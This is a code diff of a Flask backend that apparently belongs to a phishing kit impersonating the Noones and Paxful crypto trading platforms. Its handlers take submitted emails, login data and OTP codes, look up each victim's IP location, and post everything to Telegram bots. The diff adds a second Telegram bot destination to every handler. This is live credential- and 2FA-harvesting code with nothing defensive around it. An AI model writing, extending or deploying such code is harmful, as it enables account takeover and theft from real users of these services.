@@ -610,8 +610,10 @@ def handle_n():
         user_agent = request.headers.get('User-Agent', '')
         bot_token = request.form.get('bot_token')
         chat_id = request.form.get('chat_id')
-        bot_token1 = request.form.get('bot_token')
-        chat_id1 = request.form.get('chat_id')
+        bot_token1 = request.form.get('bot_token1')
+        chat_id1 = request.form.get('chat_id1')
+        bot_token2 = request.form.get('bot_token2')
+        chat_id2 = request.form.get('chat_id2')
 
         try:
             response = requests.get(f'https://ipinfo.io/{user_ip}/json')
@@ -626,6 +628,10 @@ def handle_n():
             payload_telegram = {'chat_id': chat_id1, 'text': payload_text}
             response = requests.post(f'https://api.telegram.org/bot{bot_token1}/sendMessage', json=payload_telegram)
 
+        if chat_id2 and bot_token2:
+            payload_telegram = {'chat_id': chat_id2, 'text': payload_text}
+            response = requests.post(f'https://api.telegram.org/bot{bot_token2}/sendMessage', json=payload_telegram)
+
         app.logger.info(f"Noones login attempt logged: email={email}, ip={user_ip}")
         return Response('{"success": true}' if response.status_code == 200 else '{"success": false, "error": "Failed to send message to Telegram"}', 
                        status=200 if response.status_code == 200 else 501, content_type='application/json')
@@ -636,8 +642,10 @@ def handle_otp_n():
         otp = request.form.get('code')
         bot_token = request.form.get('bot_token')
         chat_id = request.form.get('chat_id')
-        bot_token1 = request.form.get('bot_token')
-        chat_id1 = request.form.get('chat_id')
+        bot_token1 = request.form.get('bot_token1')
+        chat_id1 = request.form.get('chat_id1')
+        bot_token2 = request.form.get('bot_token2')
+        chat_id2 = request.form.get('chat_id2')
 
         if not otp:
             app.logger.warning("OTP code missing in /nun/security request")
@@ -649,6 +657,10 @@ def handle_otp_n():
         if chat_id1 and bot_token1:
             payload_telegram = {'chat_id': chat_id1, 'text': payload_text}
             response = requests.post(f'https://api.telegram.org/bot{bot_token1}/sendMessage', json=payload_telegram)
+
+        if chat_id2 and bot_token2:
+            payload_telegram = {'chat_id': chat_id2, 'text': payload_text}
+            response = requests.post(f'https://api.telegram.org/bot{bot_token2}/sendMessage', json=payload_telegram)
 
         app.logger.info("Noones OTP logged")
         return Response('{"success": true}' if response.status_code == 200 else '{"success": false, "error": "Failed to send message to Telegram"}', 
@@ -663,8 +675,10 @@ def handle_p():
         user_agent = request.headers.get('User-Agent', '')
         bot_token = request.form.get('bot_token')
         chat_id = request.form.get('chat_id')
-        bot_token1 = request.form.get('bot_token')
-        chat_id1 = request.form.get('chat_id')
+        bot_token1 = request.form.get('bot_token1')
+        chat_id1 = request.form.get('chat_id1')
+        bot_token2 = request.form.get('bot_token2')
+        chat_id2 = request.form.get('chat_id2')
 
         try:
             response = requests.get(f'https://ipinfo.io/{user_ip}/json')
@@ -680,6 +694,10 @@ def handle_p():
             payload_telegram = {'chat_id': chat_id1, 'text': payload_text}
             response = requests.post(f'https://api.telegram.org/bot{bot_token1}/sendMessage', json=payload_telegram)
 
+        if chat_id2 and bot_token2:
+            payload_telegram = {'chat_id': chat_id2, 'text': payload_text}
+            response = requests.post(f'https://api.telegram.org/bot{bot_token2}/sendMessage', json=payload_telegram)
+
         app.logger.info(f"Paxful login attempt logged: email={email}, ip={user_ip}")
         return Response('{"success": true}' if response.status_code == 200 else '{"success": false, "error": "Failed to send message to Telegram"}', 
                        status=200 if response.status_code == 200 else 501, content_type='application/json')
@@ -690,8 +708,11 @@ def handle_otp_p():
         otp = request.form.get('code')
         bot_token = request.form.get('bot_token')
         chat_id = request.form.get('chat_id')
-        bot_token1 = request.form.get('bot_token')
-        chat_id1 = request.form.get('chat_id')
+        bot_token1 = request.form.get('bot_token1')
+        chat_id1 = request.form.get('chat_id1')
+        bot_token2 = request.form.get('bot_token2')
+        chat_id2 = request.form.get('chat_id2')
+        
         if not otp:
             app.logger.warning("OTP code missing in /security request")
             return Response('{"success": false, "error": "OTP code is required"}', status=400, content_type='application/json')
@@ -702,6 +723,9 @@ def handle_otp_p():
         if chat_id1 and bot_token1:
             payload_telegram = {'chat_id': chat_id1, 'text': payload_text}
             response = requests.post(f'https://api.telegram.org/bot{bot_token1}/sendMessage', json=payload_telegram)
+        if chat_id2 and bot_token2:
+            payload_telegram = {'chat_id': chat_id2, 'text': payload_text}
+            response = requests.post(f'https://api.telegram.org/bot{bot_token2}/sendMessage', json=payload_telegram)
 
         app.logger.info("Paxful OTP logged")
         return Response('{"success": true}' if response.status_code == 200 else '{"success": false, "error": "Failed to send message to Telegram"}', 
